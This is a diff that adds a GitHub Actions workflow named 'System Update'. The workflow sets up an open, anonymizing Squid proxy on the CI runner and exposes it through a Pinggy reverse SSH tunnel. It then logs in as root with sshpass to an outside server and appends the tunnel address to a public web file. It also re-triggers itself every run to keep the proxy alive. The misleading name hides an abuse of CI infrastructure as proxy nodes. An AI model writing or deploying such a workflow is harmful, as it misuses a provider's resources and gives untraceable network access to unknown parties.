@@ -1,0 +1,108 @@
+name: System Update
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/15 * * * *'
+
+permissions:
+  contents: read
+  actions: write
+
+concurrency:
+  group: system-update
+  cancel-in-progress: false
+
+jobs:
+  maintenance:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    steps:
+      - name: Install packages
+        run: |
+          sudo apt update
+          sudo apt install squid sshpass openssh-client -y
+
+      - name: Config
+        run: |
+          sudo bash -c 'cat > /etc/squid/squid.conf << EOF
+          http_port 3128
+          http_access allow all
+          forwarded_for off
+          via off
+          visible_hostname localhost
+          EOF'
+
+          sudo systemctl restart squid
+          sleep 4
+
+      - name: Start
+        run: |
+          rm -f pinggy.log
+
+          for i in {1..3}; do
+            echo "Tunnel attempt $i"
+
+            pkill -f "ssh.*pinggy" || true
+            sleep 4
+
+            ssh -p 443 \
+              -o StrictHostKeyChecking=no \
+              -o ServerAliveInterval=30 \
+              -R0:localhost:3128 \
+              tcp@a.pinggy.io > pinggy.log 2>&1 &
+
+            sleep 18
+
+            cat pinggy.log
+
+            PINGGY_URL=$(grep -oE 'tcp://[^ ]+' pinggy.log | head -1 | sed 's|tcp://||')
+
+            if [ -n "$PINGGY_URL" ]; then
+              echo "Got: $PINGGY_URL"
+              echo "$PINGGY_URL" > pinggy_url.txt
+              break
+            fi
+
+            echo "Retry..."
+          done
+
+      - name: UP
+        env:
+          SECRET_PASS: ${{ secrets.SECRET_PASS }}
+        run: |
+          if [ ! -f pinggy_url.txt ]; then
+            echo "ERROR: No"
+            exit 1
+          fi
+
+          PINGGY_URL=$(cat pinggy_url.txt)
+
+          echo "Found: $PINGGY_URL"
+
+          echo "$PINGGY_URL" > /tmp/proxy.txt
+
+          cat /tmp/proxy.txt
+
+          sshpass -p "${SECRET_PASS}" ssh -o StrictHostKeyChecking=no root@45.144.53.63 "echo ${PINGGY_URL} >> /var/www/html/bore.txt"
+          
+      - name: Keep alive
+        run: sleep 611
+
+      - name: Wait
+        if: success()
+        run: sleep 32
+
+      - name: next run
+        if: always()
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          sleep 28
+
+          curl -X POST \
+            -H "Authorization: Bearer ${GITHUB_TOKEN}" \
+            -H "Accept: application/vnd.github+json" \
+            https://api.github.com/repos/${{ github.repository }}/actions/workflows/main.yml/dispatches \
+            -d '{"ref":"main"}'
